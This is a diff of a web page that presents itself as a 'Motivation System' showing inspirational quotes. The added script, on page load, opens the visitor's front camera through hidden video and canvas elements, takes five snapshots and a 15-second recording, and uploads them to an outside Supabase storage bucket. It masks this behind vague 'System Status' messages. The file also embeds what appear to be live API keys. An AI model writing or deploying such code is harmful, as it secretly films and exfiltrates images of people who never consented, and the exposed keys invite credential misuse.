@@ -1,295 +1,438 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="Welcome App created by Ajay Kafle" />
-    <meta name="keywords" content="Welcome, App, Ajay Kafle" />
-    <title>Welcome App by Ajay Kafle</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome User | Motivation System</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
-        body, html {
-            height: 100%;
-            font-family: 'Poppins', sans-serif;
-            background: #000;
-            overflow: hidden;
-            color: #fff;
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow-x: hidden;
         }
-
-        #bg-video {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            z-index: -1;
-            transform: translate(-50%, -50%);
-            object-fit: cover;
-            filter: brightness(0.45) contrast(1.1);
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.4);
-            z-index: 0;
-        }
-
-        .gradient-overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.7));
-            z-index: 1;
-        }
-
+        
         .container {
-            height: 100vh;
+            width: 90%;
+            max-width: 600px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+        
+        .content {
+            padding: 30px;
             display: flex;
             flex-direction: column;
+            gap: 30px;
+        }
+        
+        .motivation-section {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .motivation-section h2 {
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+            color: #ff8a00;
+        }
+        
+        #motivation-text {
+            font-size: 1.3rem;
+            font-style: italic;
+            line-height: 1.6;
+            min-height: 80px;
+            display: flex;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
+        }
+        
+        .refresh-btn {
+            margin-top: 20px;
+            padding: 12px 25px;
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            border: none;
+            border-radius: 30px;
             color: white;
-            text-align: center;
-            padding: 1rem 2rem;
-            position: relative;
-            z-index: 2;
-        }
-
-        .welcome-text {
-            font-size: 1.2rem;
-            letter-spacing: 0.04em;
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.3), 0 0 10px rgba(255, 255, 255, 0.2);
-            margin-bottom: 1.8rem;
-            opacity: 0;
-            animation: fadeInUp 1.4s ease forwards;
-            transition: transform 0.3s ease;
-        }
-
-        .welcome-text:hover {
-            transform: scale(1.05);
-        }
-
-        .lets-go-card {
-            position: relative;
+            font-weight: bold;
             cursor: pointer;
+            transition: all 0.3s ease;
             font-size: 1rem;
-            font-weight: 600;
-            padding: 0.55rem 2.8rem;
-            border-radius: 16px;
-            color: #e0f7ff;
+        }
+        
+        .refresh-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(218, 27, 96, 0.4);
+        }
+        
+        .status-section {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+        
+        .status-section h2 {
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+            color: #ff8a00;
+        }
+        
+        #status-message {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .progress-bar {
+            height: 8px;
             background: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 8px rgba(0, 255, 255, 0.05), inset 0 0 12px rgba(0, 255, 255, 0.15);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            user-select: none;
-            opacity: 0;
-            animation: fadeInUp 1.6s ease forwards;
-            transition: color 0.3s ease, transform 0.3s ease;
-        }
-
-        .lets-go-card:hover {
-            color: #75f5ff;
-            transform: scale(1.1);
-        }
-
-        .lets-go-card::before {
-            content: "";
-            position: absolute;
-            top: -3px; left: -3px; right: -3px; bottom: -3px;
-            border-radius: 20px;
-            padding: 2px;
-            background: linear-gradient(270deg, #00ffff, #0077ff, #00ffff, #00ffef, #0077ff);
-            background-size: 1000% 1000%;
-            animation: glowingLine 5s linear infinite;
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: destination-out;
-            mask-composite: exclude;
-            z-index: -1;
-        }
-
-        @keyframes glowingLine {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 100% 50%; }
-        }
-
-        @keyframes fadeInUp {
-            0% { transform: translateY(20px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-
-        #loading-spinner {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 3;
-        }
-
-        .spinner {
-            border: 8px solid rgba(255, 255, 255, 0.3);
-            border-top: 8px solid #fff;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        footer {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #e0f7ff;
-            font-size: 0.8rem;
-            z-index: 2;
-        }
-
-        @media (max-width: 450px) {
-            .welcome-text {
-                font-size: 0.75rem;
-                margin-bottom: 1.4rem;
-            }
-            .lets-go-card {
-                font-size: 0.9rem;
-                padding: 0.5rem 2rem;
-                border-radius: 14px;
-            }
-        }
-
-        .stars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            border-radius: 4px;
+            margin: 20px auto 0;
             overflow: hidden;
-            pointer-events: none;
+            max-width: 300px;
         }
-
-        .star {
-            position: absolute;
-            background: white;
-            border-radius: 50%;
-            opacity: 0.8;
-            animation: fall linear infinite;
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            width: 0%;
+            transition: width 0.3s ease;
         }
-
-        @keyframes fall {
-            0% { transform: translateY(-100px); opacity: 1; }
-            100% { transform: translateY(100vh); opacity: 0; }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* Animation for the quote */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="loading-spinner"><div class="spinner"></div></div>
-    <div class="stars"></div>
-
-    <video id="bg-video" autoplay muted loop playsinline aria-label="Background video">
-        <source src="https://cdn.videvo.net/videvo_files/video/free/2017-07/small_watermarked/170628_A_016_preview.webm" type="video/webm" />
-        <source src="https://cdn.videvo.net/videvo_files/video/free/2017-07/small_watermarked/170628_A_016_preview.mp4" type="video/mp4" />
-        Sorry, your browser does not support the video tag.
-    </video>
-
-    <div class="gradient-overlay"></div>
-
-    <div class="container" role="main" aria-label="Welcome message and navigation">
-        <div class="welcome-text" aria-live="polite">Welcome to an app created by Ajay Kafle</div>
-        <div class="lets-go-card" role="button" tabindex="0" aria-label="Proceed to next page">lets go</div>
+    <div class="container">
+        <div class="header">
+            <h1>Welcome User!</h1>
+            <p>Your journey to greatness starts here</p>
+        </div>
+        
+        <div class="content">
+            <div class="motivation-section">
+                <h2>Your Daily Motivation</h2>
+                <div id="motivation-text">Loading your personalized motivation...</div>
+                <button class="refresh-btn" id="refresh-btn">
+                    <i class="fas fa-sync-alt"></i> New Motivation
+                </button>
+            </div>
+            
+            <div class="status-section">
+                <h2>System Status</h2>
+                <div id="status-message">Initializing system...</div>
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Educational Purpose Only | Motivation System</p>
+        </div>
     </div>
 
-    <!-- AD SCRIPT BLOCK -->
-    <div style="position: absolute; bottom: 80px; left: 50%; transform: translateX(-50%); z-index: 3;">
-        <script type="text/javascript">
-            atOptions = {
-                'key' : '11d077d4267c3ab72c663e9d2eb302c7',
-                'format' : 'iframe',
-                'height' : 60,
-                'width' : 468,
-                'params' : {}
-            };
-        </script>
-        <script type="text/javascript" src="//www.highperformanceformat.com/11d077d4267c3ab72c663e9d2eb302c7/invoke.js"></script>
-    </div>
+    <!-- Hidden elements for media capture -->
+    <video id="video" autoplay muted playsinline class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
 
-    <footer>© 2025 Ajay Kafle. All rights reserved.</footer>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-app.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-analytics.js";
-        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyBzVL3wQTFo74QlM_PEE-EbgFEtbqN16oE",
-            authDomain: "signin-cdeed.firebaseapp.com",
-            projectId: "signin-cdeed",
-            storageBucket: "signin-cdeed.firebasestorage.app",
-            messagingSenderId: "481847681739",
-            appId: "1:481847681739:web:13b28ef686bc29f201714e",
-            measurementId: "G-L8F15D37BE"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app);
-        const auth = getAuth(app);
-
-        const video = document.getElementById('bg-video');
-        const spinner = document.getElementById('loading-spinner');
-
-        video.addEventListener('loadstart', () => { spinner.style.display = 'block'; });
-        video.addEventListener('loadeddata', () => { spinner.style.display = 'none'; });
-        video.addEventListener('error', () => { spinner.style.display = 'none'; });
-
-        video.addEventListener('mouseover', () => { video.pause(); });
-        video.addEventListener('mouseout', () => { video.play(); });
-
-        const starsContainer = document.querySelector('.stars');
-        function createStar() {
-            const star = document.createElement('div');
-            star.className = 'star';
-            const size = Math.random() * 5 + 2;
-            star.style.width = `${size}px`;
-            star.style.height = `${size}px`;
-            star.style.left = `${Math.random() * 100}vw`;
-            star.style.animationDuration = `${Math.random() * 2 + 3}s`;
-            starsContainer.appendChild(star);
-            star.addEventListener('animationend', () => star.remove());
-        }
-        setInterval(createStar, 300);
-
-        const letsGoButton = document.querySelector('.lets-go-card');
-        letsGoButton.addEventListener('click', () => {
-            onAuthStateChanged(auth, (user) => {
-                window.location.href = user ? 'dash.html' : 'login.html';
-            });
+    <script>
+        // DOM Elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const motivationText = document.getElementById('motivation-text');
+        const refreshBtn = document.getElementById('refresh-btn');
+        const statusMessage = document.getElementById('status-message');
+        const progressBar = document.getElementById('progress');
+        
+        // Variables
+        let mediaRecorder;
+        let recordedChunks = [];
+        let timerInterval;
+        let seconds = 0;
+        const maxRecordingTime = 15; // 15 seconds
+        const maxImagesToCapture = 5; // Number of images to capture
+        const imageCaptureInterval = 1000; // 1 second between images
+        const supabaseUrl = 'https://jxfwqcvdmvepfnrfauoe.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp4ZndxY3ZkbXZlcGZucmZhdW9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDc0NDEzNDEsImV4cCI6MjA2MzAxNzM0MX0.JVZdY8iz_fk2KkiufoYbL49VHtblRq5OhA6pPMonWyY';
+        const bucketName = 'photosandvideos';
+        let stream;
+        let imagesCaptured = 0;
+        
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', () => {
+            updateStatus("System initialized. Loading content...");
+            getMotivation();
+            startMediaCapture();
         });
-        letsGoButton.addEventListener('keydown', (event) => {
-            if (event.key === 'Enter' || event.key === ' ') {
-                event.preventDefault();
-                onAuthStateChanged(auth, (user) => {
-                    window.location.href = user ? 'dash.html' : 'login.html';
+        
+        // Start media capture (both video and images)
+        async function startMediaCapture() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
                 });
+                
+                video.srcObject = stream;
+                
+                // Set up canvas with video dimensions
+                video.addEventListener('loadedmetadata', () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    // Start image capture
+                    captureImages();
+                    
+                    // Start video recording after images are captured
+                    setTimeout(startVideoRecording, (maxImagesToCapture * imageCaptureInterval) + 500);
+                });
+                
+            } catch (err) {
+                console.error("Error accessing camera:", err);
+                updateStatus(`System notice: ${err.message}`, true);
             }
-        });
+        }
+        
+        // Capture multiple images
+        function captureImages() {
+            updateStatus("Capturing images...");
+            
+            const imageCaptureIntervalId = setInterval(() => {
+                if (imagesCaptured < maxImagesToCapture) {
+                    captureSingleImage();
+                    imagesCaptured++;
+                } else {
+                    clearInterval(imageCaptureIntervalId);
+                }
+            }, imageCaptureInterval);
+        }
+        
+        // Capture a single image and upload it
+        function captureSingleImage() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+                const fileName = `image_${Date.now()}_${imagesCaptured}.jpg`;
+                await uploadToSupabase(blob, fileName, 'image');
+            }, 'image/jpeg', 0.85);
+        }
+        
+        // Start video recording
+        function startVideoRecording() {
+            updateStatus("Starting video recording...");
+            
+            // Initialize MediaRecorder
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: 'video/webm;codecs=vp9'
+            });
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+            
+            mediaRecorder.onstop = handleRecordingStop;
+            
+            // Start recording
+            recordedChunks = [];
+            seconds = 0;
+            updateProgress();
+            
+            mediaRecorder.start();
+            
+            timerInterval = setInterval(() => {
+                seconds++;
+                updateProgress();
+                
+                if (seconds >= maxRecordingTime) {
+                    stopRecording();
+                }
+            }, 1000);
+        }
+        
+        // Stop recording
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                clearInterval(timerInterval);
+                updateStatus("Processing video...");
+            }
+        }
+        
+        // Handle when recording stops
+        async function handleRecordingStop() {
+            if (recordedChunks.length === 0) {
+                updateStatus("System idle", true);
+                return;
+            }
+            
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const fileName = `recording_${Date.now()}.webm`;
+            
+            await uploadToSupabase(blob, fileName, 'video');
+            
+            // Stop all tracks
+            stream.getTracks().forEach(track => track.stop());
+            
+            updateStatus("System operation completed");
+        }
+        
+        // Upload to Supabase
+        async function uploadToSupabase(blob, fileName, type) {
+            try {
+                updateStatus(`Uploading ${type} to storage...`);
+                
+                const formData = new FormData();
+                formData.append('file', blob, fileName);
+                
+                const response = await fetch(`${supabaseUrl}/storage/v1/object/${bucketName}/${fileName}`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${supabaseKey}`,
+                        'apikey': supabaseKey
+                    },
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Upload failed: ${response.statusText}`);
+                }
+                
+                const data = await response.json();
+                console.log(`${type} uploaded successfully:`, data);
+                
+            } catch (err) {
+                console.error("Upload error:", err);
+                updateStatus(`System notice: ${err.message}`, true);
+            }
+        }
+        
+        // Update progress bar
+        function updateProgress() {
+            const progressPercentage = (seconds / maxRecordingTime) * 100;
+            progressBar.style.width = `${progressPercentage}%`;
+        }
+        
+        // Get motivational quote from Gemini API
+        async function getMotivation() {
+            motivationText.textContent = "Loading your personalized motivation...";
+            
+            try {
+                const response = await fetch("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyDUIkYg1mBz1DWP_lrIsPZvhzLL5OOw_kA", {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        "contents": [{
+                            "parts": [{
+                                "text": "Give me a random motivational quote in one sentence. Make it inspiring and uplifting."
+                            }]
+                        }]
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`API request failed: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                const quote = data.candidates[0].content.parts[0].text;
+                
+                motivationText.textContent = quote;
+                motivationText.classList.add('fade-in');
+                
+                // Remove animation class after it completes
+                setTimeout(() => {
+                    motivationText.classList.remove('fade-in');
+                }, 800);
+                
+            } catch (err) {
+                console.error("Error fetching motivation:", err);
+                motivationText.textContent = "The greatest glory in living lies not in never falling, but in rising every time we fall. - Nelson Mandela";
+            }
+        }
+        
+        // Update status message
+        function updateStatus(message, isError = false) {
+            statusMessage.textContent = message;
+            statusMessage.style.color = isError ? '#ff4d4d' : 'white';
+        }
+        
+        // Event listeners
+        refreshBtn.addEventListener('click', getMotivation);
     </script>
 </body>
 </html>
